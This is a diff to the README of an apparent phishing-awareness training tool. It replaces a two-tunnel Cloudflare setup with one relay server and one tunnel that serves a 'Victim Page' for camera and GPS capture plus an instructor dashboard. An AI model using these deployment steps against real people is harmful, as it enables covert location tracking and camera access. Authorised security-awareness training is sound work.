@@ -160,44 +160,34 @@ After connecting, the header shows: `SESSION: <id>   ROOM: <room>` so the instru
 
 ---
 
-## 🌐 Remote Deployment & Cloudflare Tunnels (HTTPS & WSS)
+## 🔄 How to Update
+You do **not** need to re-clone the repository to get the latest fixes. Just run the update script in your terminal:
+- **Linux/Kali:** `./update.sh`
+- **Windows:** `./update.ps1`
 
-Modern browsers *strictly require* **HTTPS** to access sensitive APIs like `navigator.geolocation` and `navigator.mediaDevices` (Camera). If you host this over plain HTTP (e.g. `http://YOUR-IP:8080`), the camera and GPS will be blocked outright.
+This will pull the latest code and update any new dependencies automatically.
 
-To deploy safely and quickly without messing with SSL certs, use **Cloudflare Tunnels** (`cloudflared`).
+## 🌐 Remote Deployment (Unified Architecture)
+The platform now uses a **unified server** (`relay.js`). This means you only need **one** Cloudflare tunnel for everything (Camera, GPS, WebSocket, and Dashboard).
 
-### Step 1: Install `cloudflared` on your Linux server
-
+### Step 1: Start the Relay
 ```bash
-curl -L -o cloudflared.deb https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb
-sudo dpkg -i cloudflared.deb
+node relay.js
 ```
 
-### Step 2: Start the Web and WebSocket tunnels
-
-You need to expose the normal HTTP server (port 8080) and the WebSocket Relay (port 8765). Open two terminal sessions and run:
-
-**Terminal 1 (HTTP Website):**
-
-```bash
-cloudflared tunnel --url http://localhost:8080
-```
-
-**Terminal 2 (WebSocket Relay):**
-
+### Step 2: Open One Tunnel
+In a new terminal, point Cloudflare to the relay port (`8765`):
 ```bash
 cloudflared tunnel --url http://localhost:8765
 ```
 
-### Step 3: Configure `phish.html` and `instructor.html`
+### Step 3: Access
+Cloudflare will provide a secure URL (e.g. `https://example.trycloudflare.com`).
+- **Victim Page:** `https://example.trycloudflare.com/phish`
+- **Instructor Dashboard:** `https://example.trycloudflare.com/instructor`
 
-Cloudflare will print two secure URLs (e.g., `https://random-words.trycloudflare.com`).
-1. Update `WS_URL` in both **`phish.html`** and **`instructor.html`** to point to the WebSocket URL (use `wss://` instead of `https://`):
-   ```javascript
-   const WS_URL = 'wss://your-second-tunnel.trycloudflare.com';
-   ```
-
-2. Distribute the first URL (HTTP Website) to your training participants.
+> [!TIP]
+> Use the **`launch.sh`** script (on Linux) to automate this entire process with one command. It will start the server, the tunnel, and print the final active links for you.
 
 ---
 
